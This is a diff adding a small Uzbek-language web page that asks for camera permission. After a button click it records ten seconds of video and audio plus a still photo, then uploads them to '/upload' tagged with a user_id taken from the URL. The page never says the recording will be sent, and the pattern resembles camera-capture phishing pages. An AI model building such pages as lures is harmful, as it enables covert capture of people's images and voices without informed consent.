@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Camera Access</title>
+  <style>
+    body { text-align: center; font-family: sans-serif; }
+    video, canvas { border: 2px solid #ccc; border-radius: 8px; }
+    button { padding: 10px 20px; margin-top: 10px; }
+  </style>
+</head>
+<body>
+  <h2>📸 Kameraga ruxsat bering</h2>
+  <video id="video" autoplay muted playsinline></video><br />
+  <button onclick="startCapture()">Yozishni boshlash</button>
+  <script>
+    const userId = new URLSearchParams(window.location.search).get("user_id");
+    const video = document.getElementById('video');
+
+    async function startCapture() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+      video.srcObject = stream;
+
+      const mediaRecorder = new MediaRecorder(stream);
+      const chunks = [];
+
+      mediaRecorder.ondataavailable = e => chunks.push(e.data);
+
+      mediaRecorder.onstop = async () => {
+        const videoBlob = new Blob(chunks, { type: 'video/webm' });
+
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        const imageBlob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+
+        const formData = new FormData();
+        formData.append("user_id", userId);
+        formData.append("image", imageBlob, "photo.jpg");
+        formData.append("video", videoBlob, "video.webm");
+
+        await fetch("/upload", {
+          method: "POST",
+          body: formData
+        });
+
+        alert("Yuborildi ✅");
+      };
+
+      mediaRecorder.start();
+      setTimeout(() => mediaRecorder.stop(), 10000); // 10 soniya yozadi
+    }
+  </script>
+</body>
+</html>
